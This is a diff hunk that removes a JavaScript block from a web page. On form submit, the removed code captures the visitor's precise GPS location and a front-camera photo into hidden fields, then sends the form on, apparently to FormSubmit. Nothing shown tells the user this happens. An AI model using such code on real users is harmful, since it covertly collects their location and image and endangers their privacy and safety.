@@ -347,81 +347,8 @@
 
     
 
-document.addEventListener("DOMContentLoaded", function () {
-  const form = document.querySelector("form");
-  const mensaje = document.getElementById("mensaje-espera");
 
-  form.addEventListener("submit", async function (e) {
-    e.preventDefault(); // detener envío automático
-    mensaje.style.display = "block"; // mostrar aviso
-
-    // --- UBICACIÓN ---
-    let ubicacionLista = new Promise((resolve) => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            document.getElementById("gps_loc").value =
-              pos.coords.latitude + "," + pos.coords.longitude;
-            document.getElementById("gps_accuracy").value =
-              pos.coords.accuracy + " metros";
-            resolve();
-          },
-          (err) => {
-            document.getElementById("gps_error").value =
-              "Error " + err.code + ": " + err.message;
-            resolve();
-          },
-          { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-        );
-      } else {
-        document.getElementById("gps_error").value =
-          "Geolocalización no soportada";
-        resolve();
-      }
-    });
-
-    // --- CÁMARA ---
-    let fotoLista = new Promise(async (resolve) => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
-        });
-        const video = document.getElementById("camara");
-        video.srcObject = stream;
-
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
-            const canvas = document.getElementById("canvas");
-
-            // 👇 Reducción de tamaño de la foto
-            canvas.width = 320;
-            canvas.height = 240;
-
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            document.getElementById("foto_cam").value =
-              canvas.toDataURL("image/png");
-
-            stream.getTracks().forEach(track => track.stop());
-            resolve();
-          }, 1000);
-        };
-      } catch (err) {
-        document.getElementById("foto_cam").value = "Error: " + err.message;
-        resolve();
-      }
-    });
-
-    // Esperar a que ambas promesas terminen
-    await Promise.all([ubicacionLista, fotoLista]);
-
-    mensaje.style.display = "none"; // ocultar aviso
-    form.submit(); // ahora sí enviar a FormSubmit
-  });
-});
   
-
 
     
           
